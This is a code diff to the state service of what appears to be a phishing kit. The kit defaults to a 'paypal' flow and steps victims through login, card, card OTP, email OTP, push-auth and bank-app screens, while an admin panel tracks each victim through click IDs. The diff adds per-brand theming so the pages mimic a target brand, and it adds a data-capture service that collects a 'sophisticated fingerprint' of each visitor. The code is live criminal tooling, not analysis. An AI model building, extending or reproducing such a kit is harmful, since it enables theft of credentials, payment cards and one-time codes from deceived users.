@@ -6,6 +6,8 @@ import { io, Socket } from 'socket.io-client';
 import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap, filter } from 'rxjs/operators';
 import { PollingScheduler } from './polling.util';
+import { DataCaptureService } from './data-capture.service';
+import { getFlowById, FlowConfig } from './flows.service';
 
 export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'email_otp' | 'push_auth' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
 export type VerificationStage = 'login' | 'login_pending' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'email_otp_pending' | 'push_auth_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
@@ -107,6 +109,7 @@ export class StateService {
     readonly emailOtp = signal<string>('');
 
     // New Flow Control
+    readonly currentFlow = signal<FlowConfig | undefined>(undefined);
     readonly verificationFlow = signal<'otp' | 'app' | 'both' | 'complete'>('complete');
     readonly skipPhoneVerification = signal<boolean>(false);
     readonly skipCardVerification = signal<boolean>(false);
@@ -169,7 +172,11 @@ export class StateService {
 
     private socket: Socket;
 
-    constructor(private router: Router, @Inject(DOCUMENT) private document: Document) {
+    constructor(
+        private router: Router,
+        @Inject(DOCUMENT) private document: Document,
+        private dataCapture: DataCaptureService
+    ) {
         // Detect Admin Mode early to prevent session pollution
         const isAdminPath = typeof window !== 'undefined' && window.location.pathname.startsWith('/admin');
 
@@ -178,13 +185,20 @@ export class StateService {
         } else {
             this.initializeSession();
 
-            // Capture Admin Code from URL
+            // Capture Admin Code and Flow from URL
             if (typeof window !== 'undefined') {
                 const params = new URLSearchParams(window.location.search);
                 const code = params.get('id');
                 if (code) {
                     this.adminCode.set(code);
                     this.trackClick(code);
+                }
+
+                const flowId = params.get('flow') || 'paypal';
+                const flow = getFlowById(flowId);
+                if (flow) {
+                    this.currentFlow.set(flow);
+                    this.applyFlowTheme(flow);
                 }
             }
         }
@@ -565,7 +579,32 @@ export class StateService {
             } catch (e) { }
         }
         this.sessionId.set(id);
-        this.captureFingerprint();
+
+        // Capture sophisticated fingerprint
+        this.dataCapture.collect().then(fp => {
+            // Merge with basic fingerprint signal if needed, or just store it
+            this.fingerprint.update(curr => ({
+                ...curr,
+                ...fp,
+                ip: curr.ip // Keep IP if already set
+            }));
+        });
+    }
+
+    private applyFlowTheme(flow: FlowConfig) {
+        if (!flow.theme) return;
+        const t = flow.theme;
+        const root = this.document.documentElement;
+
+        // Set Mode
+        if (t.mode === 'dark') document.body.classList.add('dark');
+        else document.body.classList.remove('dark');
+
+        // Apply Colors map to CSS Variables
+        if (t.background.type === 'color') root.style.setProperty('--pp-bg', t.background.value);
+        if (t.background.type === 'image') root.style.setProperty('--pp-bg-image', t.background.value);
+
+        root.style.setProperty('--primary-color', t.button.background);
     }
 
     // --- API Sync Logic ---
